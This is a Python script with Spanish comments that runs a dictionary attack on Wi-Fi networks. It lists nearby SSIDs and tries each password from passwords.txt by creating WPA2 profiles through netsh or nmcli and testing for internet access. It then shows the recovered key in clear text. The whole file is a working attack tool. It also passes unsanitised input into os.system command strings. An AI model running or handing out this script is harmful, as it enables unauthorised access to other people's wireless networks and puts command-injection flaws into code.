import os
import platform
import time
import requests

url = "http://www.python.org"
timeout = 5


def createNewConnection(name, SSID, key):
    """
    Generar una nueva conexión inalámbrica
    :param name: Nombre de la red
    :param SSID: Identificador de red
    :param key: Password
    :return: None
    """
    # Realizar la configuración mediante un arcihico
    # xml (lenguaje de marcado extensible)
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>""" + name + """</name>
    <SSIDConfig>
        <SSID>
            <name>""" + SSID + """</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>""" + key + """</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    # En caso de que el sistema sea Windows
    if platform.system() == "Windows":
        # Usar el comando
        command = "netsh wlan add profile filename=\"" + name + ".xml\"" + " interface=Wi-Fi"
        with open(name + ".xml", 'w') as file:
            # Escribir el archivo de configuración
            file.write(config)
    # En caso de que el sistema sea Linux
    elif platform.system() == "Linux":
        command = "nmcli dev wifi connect '" + SSID + "' password '" + key + "'"
    # Enviar la línea de comando
    os.system(command)
    if platform.system() == "Windows":
        # Eliminar el archivo de configuración XML
        os.remove(name + ".xml")


def connect(name, SSID):
    """
    Realiza la conexión con una red de manera inalámbrica
    :param name: Nombre de la red
    :param SSID: Identificador de red
    :return: None
    """
    os.system("netsh wlan connect name=\"" + name + "\" ssid=\"" + SSID + "\" interface=Wi-Fi")


def displayAvailableNetworks():
    '''
    Muestra todas las redes inalámbricas disponibles
    :return: None
    '''
    os.system("netsh wlan show networks interface=Wi-Fi")

# INICIO DEL PROGRAMA
print("Buscando si hay conexiones inalámbricas")

# Intentar ingresa a un sitio web
try:
    # Realizar un pedido a una página web
    request = requests.get(url, timeout=timeout)
    # En caso de que la instrucción anterior no genere una excepción
    print("[-] Favor de desconectar cualquier conexión de internet"), exit()

except (requests.ConnectionError, requests.Timeout) as exception:
    # La excepción de que tarda en realizar la conexión
    print("Iniciando programa..."), time.sleep(1)

# Mientras este activo
connected = True
while connected:
    try:
        # Mostrar las redes disponibles
        displayAvailableNetworks()
        WIFI = input("Nombre WIFI: ")
        # Abrir el archivo con las contraseñas
        with open("passwords.txt", "r") as f:
            # Recorrer contraseña a contraseña
            for line in f:
                words = line.split()
                # Sí hay una cadena de texto
                if words:
                    # Imprimir el password a probar
                    print(f"Password: {words[0]}")

                    # Crear una nueva conexión
                    createNewConnection(WIFI, WIFI, words[0])
                    # Conectar
                    connect(WIFI, WIFI)

                    try:
                        # Hacer una petición a una URL
                        request = requests.get(url, timeout=timeout)
                        # Colocar conectividad false
                        connected = False
                        #
                        choice = input(
                            f"[+] Se obtuvo la contraseña, ¿está conectado a {WIFI} (s/N) ? ")
                        if choice == "s":
                            print("\n[SALIENDO] Operación concretada")
                            exit()
                        elif choice == "n":
                            print("\n[-] Continuar operación\n")

                    except (requests.ConnectionError, requests.Timeout) as exception:
                        print("Cargando programa..."), time.sleep(1)

        print("[+] Operación completada")
        choice = input("Ver información de la WIFI (s/N) ? ")
        if choice == "s" or "S":
            print(f"Buscado la red {WIFI}")
            time.sleep(1)
            os.system(f'netsh wlan show profile name="{WIFI}" key=clear')
            exit()
        elif choice == "n" or "N":
            print("\nSaliendo del programa...")
            time.sleep(2)
            exit()

    except KeyboardInterrupt as e:
        print("\nAbortando programa...")
        exit()
